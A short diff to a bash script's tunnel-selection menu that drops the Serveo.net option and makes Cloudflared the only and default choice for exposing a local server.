@@ -141,15 +141,13 @@ start_server() {
 # Tunnel Selection Menu
 select_tunnel() {
     echo -e "${YELLOW}[+] Select a tunnel:${RESET}"
-    echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Serveo.net${RESET}"
-    echo -e "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
-    echo -ne "${GREEN}[+] Enter choice (1 or 2):${RESET} "
+    echo -e "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m ${BLUE}Cloudflared${RESET}"
+    echo -ne "${GREEN}[+] Enter choice (1):${RESET} "
     read  choice
 
     case $choice in
-        1) TUNNEL_CHOICE="serveo , Don't choose this.It's not working  " ;;
-        2) TUNNEL_CHOICE="cloudflared" ;;
-        *) echo -e "${RED}[-] Invalid choice! Defaulting to Serveo.net.${RESET}"; TUNNEL_CHOICE="serveo" ;;
+        1) TUNNEL_CHOICE="cloudflared" ;;
+        *) echo -e "${RED}[-] Invalid choice! Defaulting to cloudflared${RESET}"; TUNNEL_CHOICE="cloudflared" ;;
     esac
 }
 
